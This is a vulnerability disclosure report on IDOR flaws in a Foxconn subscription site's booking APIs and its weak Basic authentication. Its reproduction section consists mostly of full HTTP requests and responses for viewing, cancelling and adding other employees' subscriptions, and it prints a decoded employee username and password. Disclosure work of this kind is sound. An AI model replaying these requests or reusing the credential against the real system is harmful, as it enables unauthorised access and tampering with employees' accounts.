## Summary

The vulnerability in the Subscription Service website (**bboss.foxconn.com**) involves `Insecure Direct Object Reference` (IDOR) in multiple API endpoints for managing subscriptions (`/another-api/push-service/booking/get-booking`, `.../abort-booking`, and `.../init-booking`). Attackers can manipulate the `recipientId` parameter (employee ID) and `categoryIds` (subscription IDs) to **view**, **cancel**, or **add** subscriptions on behalf of other users without proper authorization checks. Additionally, the Authorization header uses `Basic authentication` with unencrypted Base64-encoded credentials, making it vulnerable to decoding and potential reuse.



## Affected Product


- **Vendor:** Foxconn
- **Product:** Subscription Service System
- **Version:** Current as of 2025-11-20
- **Component:** Subscription Module
- **Domain:** bboss.foxconn.com

**Note:** The vulnerability was confirmed in the live web application as of 2025-11-20. Since the application does not expose a version string, a specific version number could not be determined.



## Impact

* **Unauthorized Data Access:** Attackers can harvest sensitive user data, such as subscription details, which may expose personal preferences or internal company roles.
* **Identity Impersonation & Service Disruption:** Attackers can impersonate employees to arbitrarily add or cancel subscriptions. This leads to unwanted notifications, spam, or denial of access to legitimate educational content for the victim.
* **Credential Exposure via Weak Encoding:** The use of `Basic Authentication` with easily reversible Base64 encoding exposes cleartext employee IDs and passwords (e.g., `F3236003:3236003`). This significantly increases the risk of full account takeover and lateral movement within the Foxconn network if the request is intercepted or logged.



## CVSS v3.1 Score

**Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`

**Base Score:** **9.1 (Critical)**

- AV (Attack Vector): `Network`
- AC (Attack Complexity): `Low`
- PR (Privileges Required): `None`
- UI (User Interaction): `None`
- S (Scope): `Unchanged`
- C (Confidentiality): `High`
- I (Integrity): `High`
- A (Availability): `None`



## Reproduction Steps

Navigate to the Subscription Service website (`https://bboss.foxconn.com/subscription/#/af/managements?data=eyJ1c2VyTmFtZSI6IkYxMjQ1MzYzliwicmVhbE5hbWUiOiLpu4TIrofovokifQ==`), and it will redirect to the following page:

> Note that decoding the Base64 string reveals the user identity data: `{"userName":"F1245363,"realName":"RealEmployeeName"}`

![](./image-20251125110209722.png)

Then click on "Subscription Service", which redirects to the my subscription information page, as shown below:

![](./image-20251125110437738.png)

Subsequently, perform `CRUD` operations (add subscription, delete subscription, view subscription, etc.) on the subscription service page, observe the API request history in BurpSuite and conduct web penetration testing, and discover the following vulnerabilities:

1. The authentication information in the request header `Authorization: Basic RjMyMzYwMDM6MzIzNjAwMw==` is not encrypted. Decoding the Base64 value `RjMyMzYwMDM6MzIzNjAwMw==` results in `F3236003:3236003`, indicating that the username is `F3236003` and the password is `3236003`.
2. The API for querying subscription data has an IDOR vulnerability, meaning that by modifying the value of the `recipientId` parameter (employee ID) in the request parameters, the subscription data of a specified employee can be obtained.
3. The API for canceling subscriptions has an IDOR vulnerability, meaning that by modifying the values of the `recipientId` parameter (employee ID) and `categoryIds` parameter (subscription IDs) in the request parameters, the subscriptions of a specified employee can be canceled.
4. The API for adding subscriptions has an IDOR vulnerability, meaning that by modifying the values of the `recipientId` parameter (employee ID) and `categoryIds` parameter (subscription IDs) in the request parameters, new subscriptions can be added for a specified employee.

### Reproduce the 1st IDOR

First, reproduce the 1st IDOR vulnerability, which is by modifying the value of the `recipientId` parameter (employee ID) in the request parameters, the subscription data of the specified employee ID can be obtained.

Attempt to change the value of `recipientId` in the original API request from `F1245363` to `F1245362` (victim's employee ID), and then send the request to the server. The request data and the server's response data are as shown below:

```http
GET /another-api/push-service/booking/get-booking?recipientId=F1245362&businessId=af HTTP/1.1
Host: bboss.foxconn.com
Sec-Ch-Ua-Platform: "Windows"
Authorization: Basic RjMyMzYwMDM6MzIzNjAwMw==
Accept-Language: zh-TW,zh;q=0.9
Accept: application/json, text/plain, */*
Sec-Ch-Ua: "Not_A Brand";v="99", "Chromium";v="142"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Sec-Ch-Ua-Mobile: ?0
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://bboss.foxconn.com/subscription/
Accept-Encoding: gzip, deflate, br
Priority: u=1, i
Connection: keep-alive
```

```http
HTTP/1.1 200 
Date: Tue, 25 Nov 2025 06:20:28 GMT
Content-Type: application/json;charset=UTF-8
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
X-Frame-Options: DENY
Content-Security-Policy: style-src 'self' ; object-src  'self' 
Content-Security-Policy: frame-ancestors 'self' *.foxconn.com http://*.foxconn.com *.fulearn.com 
Content-Security-Policy: script-src  'unsafe-inline' 'unsafe-eval'  'strict-dynamic' 'nonce-123456'  'sha256-MS6/3FCg4WjP9gwgaBGwLpRCY6fZBgwmhVCdrPrNf3E=' 'sha256-tQjf8gvb2ROOMapIxFvFAYBeUJ0v1HCbOcSmDNXGtDo='  'sha256-4y/gEB2/KIwZFTfNqwXJq4olzvmQ0S214m9jwKgNXoc=' 'sha256-+5XkZFazzJo8n0iOP4ti/cLCMUudTf//Mzkb7xNPXIc='  
X-Xss-Protection: 1;mode=block
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
X-Frame-Options: SAMEORIGIN
Content-Length: 248

{
  "status": 0,
  "message": "操作成功",
  "data": [
    {
      "id": "pj100",
      "showId": "100",
      "name": "早安富士康",
      "photo": "5531390037320532.jpg",
      "categoryType": "project",
      "parentId": "pj0",
      "isValid": "t",
      "isSelected": "t"
    }
  ],
  "requesttime": "2025-11-25T14:20:05.203582"
}
```

### Reproduce the 2nd IDOR

Next, reproduce the 2nd IDOR vulnerability, which is by modifying the values of the `recipientId` parameter (employee ID) and `categoryIds` parameter (subscription IDs) in the request parameters, the subscriptions of a specified employee can be canceled.

Attempt to change the value of `recipientId` in the original API request from `F1245363` to `F1245362` (victim's employee ID), and assume that the victim has also subscribed to the subscription IDs `g11362, pj144`, then send the request to the server. The request data and the server's response data are as shown below:

```http
POST /another-api/push-service/booking/abort-booking?recipientId=F1245362&categoryIds=g11362,pj144 HTTP/1.1
Host: bboss.foxconn.com
Content-Length: 0
Authorization: Basic RjMyMzYwMDM6MzIzNjAwMw==
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: zh-TW,zh;q=0.9
Accept: application/json, text/plain, */*
Sec-Ch-Ua: "Not_A Brand";v="99", "Chromium";v="142"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Sec-Ch-Ua-Mobile: ?0
Origin: https://bboss.foxconn.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://bboss.foxconn.com/subscription/
Accept-Encoding: gzip, deflate, br
Priority: u=1, i
Connection: keep-alive
```

```http
HTTP/1.1 200 
Date: Tue, 25 Nov 2025 06:19:59 GMT
Content-Type: application/json;charset=UTF-8
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
X-Frame-Options: DENY
Content-Security-Policy: style-src 'self' ; object-src  'self' 
Content-Security-Policy: frame-ancestors 'self' *.foxconn.com http://*.foxconn.com *.fulearn.com 
Content-Security-Policy: script-src  'unsafe-inline' 'unsafe-eval'  'strict-dynamic' 'nonce-123456'  'sha256-MS6/3FCg4WjP9gwgaBGwLpRCY6fZBgwmhVCdrPrNf3E=' 'sha256-tQjf8gvb2ROOMapIxFvFAYBeUJ0v1HCbOcSmDNXGtDo='  'sha256-4y/gEB2/KIwZFTfNqwXJq4olzvmQ0S214m9jwKgNXoc=' 'sha256-+5XkZFazzJo8n0iOP4ti/cLCMUudTf//Mzkb7xNPXIc='  
X-Xss-Protection: 1;mode=block
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
X-Frame-Options: SAMEORIGIN
Content-Length: 92

{
  "status": 0,
  "message": "操作成功",
  "data": null,
  "requesttime": "2025-11-25T14:19:35.906201"
}
```

### Reproduce the 3rd IDOR

Next, reproduce the 3rd IDOR vulnerability, which is by modifying the values of the `recipientId` parameter (employee ID) and `categoryIds` parameter (subscription IDs) in the request parameters, new subscriptions can be added for a specified employee.

Attempt to change the value of `recipientId` in the original API request from `F1245363` to `F1245311` (victim's employee ID), and specify the subscription ID (`g12096`) that you want the victim to subscribe to, then send the request to the server. The request data and the server's response data are as shown below:

```http
POST /another-api/push-service/booking/init-booking?recipientId=F1245311&categoryIds=g12096 HTTP/1.1
Host: bboss.foxconn.com
Content-Length: 0
Authorization: Basic RjMyMzYwMDM6MzIzNjAwMw==
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: zh-TW,zh;q=0.9
Accept: application/json, text/plain, */*
Sec-Ch-Ua: "Not_A Brand";v="99", "Chromium";v="142"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Sec-Ch-Ua-Mobile: ?0
Origin: https://bboss.foxconn.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://bboss.foxconn.com/subscription/
Accept-Encoding: gzip, deflate, br
Priority: u=1, i
Connection: keep-alive
```

```http
HTTP/1.1 200 
Date: Tue, 25 Nov 2025 07:07:11 GMT
Content-Type: application/json;charset=UTF-8
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
X-Frame-Options: DENY
Content-Security-Policy: style-src 'self' ; object-src  'self' 
Content-Security-Policy: frame-ancestors 'self' *.foxconn.com http://*.foxconn.com *.fulearn.com 
Content-Security-Policy: script-src  'unsafe-inline' 'unsafe-eval'  'strict-dynamic' 'nonce-123456'  'sha256-MS6/3FCg4WjP9gwgaBGwLpRCY6fZBgwmhVCdrPrNf3E=' 'sha256-tQjf8gvb2ROOMapIxFvFAYBeUJ0v1HCbOcSmDNXGtDo='  'sha256-4y/gEB2/KIwZFTfNqwXJq4olzvmQ0S214m9jwKgNXoc=' 'sha256-+5XkZFazzJo8n0iOP4ti/cLCMUudTf//Mzkb7xNPXIc='  
X-Xss-Protection: 1;mode=block
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
X-Frame-Options: SAMEORIGIN
Content-Length: 92

{
  "status": 0,
  "message": "操作成功",
  "data": null,
  "requesttime": "2025-11-25T15:06:47.715426"
}
```



## Remediation

* **Fix IDOR Vulnerabilities:** Implement proper authorization checks on the server side to ensure the `recipientId` matches the authenticated user's ID from the session or token. Use indirect references (e.g., hashed or mapped IDs) instead of direct employee IDs in API parameters.
* **Enhance Authentication:** Replace `Basic authentication` with more secure methods like Bearer tokens (e.g., `JWT`) that include expiration, signatures, and are not easily decodable.



## Timeline
- **2025-11-20:** Vulnerability identified and initial proof-of-concept (PoC) verified.

- **2025-11-28:** Detailed vulnerability report submitted to the vendor for remediation. No acknowledgment or remediation confirmation received as of 2026-01-14.

- **2026-01-14:** Decision made to proceed with public disclosure following the expiration of a reasonable grace period.




## CWE References

* [CWE-639: Authorization Bypass Through User-Controlled Key](https://cwe.mitre.org/data/definitions/639.html)
* [CWE-798: Use of Hard-coded Credentials](https://cwe.mitre.org/data/definitions/798.html)